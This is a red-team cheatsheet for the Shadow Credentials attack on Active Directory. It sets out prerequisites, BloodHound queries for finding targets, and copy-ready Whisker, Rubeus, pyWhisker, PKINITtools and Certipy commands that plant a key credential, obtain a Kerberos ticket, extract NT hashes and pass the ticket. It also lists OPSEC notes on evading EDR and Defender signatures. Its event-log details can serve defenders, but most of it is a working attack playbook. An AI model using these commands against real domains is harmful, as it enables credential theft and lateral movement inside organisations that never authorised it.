# Cheatsheet: Credential access

---

## Shadow Credentials

> Abuses write access to `msDS-KeyCredentialLink` on AD objects (the same attribute Windows Hello for Business uses). Add your own key credential → authenticate via PKINIT → extract NT hash. No password change, no LSASS touch.

### Prerequisites

- Write permission on target object's `msDS-KeyCredentialLink`:
  `GenericWrite` / `GenericAll` / `WriteProperty` / `WriteDacl` / `WriteOwner`
- DC must support PKINIT (cert-based Kerberos auth) — standard on most modern domains
- Domain Functional Level 2016+

> BloodHound query to find targets:
> ```cypher
> MATCH (n)-[r:GenericWrite]->(m:User) RETURN n,r,m
> MATCH (n)-[r:GenericWrite]->(m:Computer) RETURN n,r,m
> ```

### Attack Flow

```
1. Add attacker key credential → msDS-KeyCredentialLink of target object
2. Authenticate as target via PKINIT using the key pair → receive TGT
3. Use TGT + Kerberos U2U → extract target NT hash
4. PTH or use TGT directly for lateral movement
```

### Execution — CS `OPSEC-CAUTION`

```cs
// Step 1 — add shadow credential (Whisker outputs a ready-to-run Rubeus command)
beacon> execute-assembly Whisker.exe add /target:targetuser

// Step 2 — authenticate via PKINIT, get TGT and NT hash in one shot
beacon> execute-assembly Rubeus.exe asktgt /user:targetuser /certificate:<b64cert> /password:<certpass> /getcredentials /show /nowrap

// Step 3 — use TGT (pass-the-ticket)
beacon> execute-assembly Rubeus.exe ptt /ticket:<b64ticket>

// Cleanup — always remove your key after use
beacon> execute-assembly Whisker.exe list /target:targetuser
beacon> execute-assembly Whisker.exe remove /target:targetuser /deviceid:<guid>
```

### Execution — Adaptix / Kali `OPSEC-CAUTION`

```bash
# Step 1 — add shadow credential
pywhisker.py -d DOMAIN -u attacker -p 'pass' --target targetuser --action add

# Step 2 — PKINIT auth → get TGT
gettgtpkinit.py DOMAIN/targetuser -cert-pfx cert.pfx -pfx-pass <pass> targetuser.ccache
export KRB5CCNAME=targetuser.ccache

# Step 3 — extract NT hash from TGT
getnthash.py DOMAIN/targetuser -key <aes-key-from-gettgtpkinit>

# All-in-one via Certipy (cleanest from Kali)
certipy shadow auto -u attacker@DOMAIN -p 'pass' -account targetuser
# Outputs NT hash directly

# Cleanup
pywhisker.py -d DOMAIN -u attacker -p 'pass' --target targetuser --action remove --device-id <guid>
```

### OPSEC Pre-Check

```
Tier:          CAUTION
Spawns proc:   Yes — sacrificial process via execute-assembly (fork & run)
Touches LSASS: No
Writes disk:   No — cert handled in-memory by Rubeus
Event logs:    5136 (msDS-KeyCredentialLink modification)
               4768 (TGT requested via PKINIT / cert auth)
EDR telemetry: LDAP write to sensitive attribute; anomalous cert-based TGT
Defender sig:  Whisker binary is known — obfuscate or use pyWhisker from Kali
Safer alt:     Run from Kali with pyWhisker/Certipy to avoid CS binary on disk
```

### Tools

| Tool | Language | Invoke From |
|------|----------|-------------|
| Whisker | C# | `execute-assembly` |
| pyWhisker | Python | Kali shell |
| Certipy (`shadow auto`) | Python | Kali shell — all-in-one |

### When to Use

- Target user/computer has no SPN (can't Kerberoast) but you have write ACL over them
- Stealthier than LSASS dumping — no LSASS touch, no service creation
- Useful when pivoting through misconfigured delegations or owned computer accounts
- Computer account shadow creds → machine NT hash → RBCD or S4U2Self escalation path

---

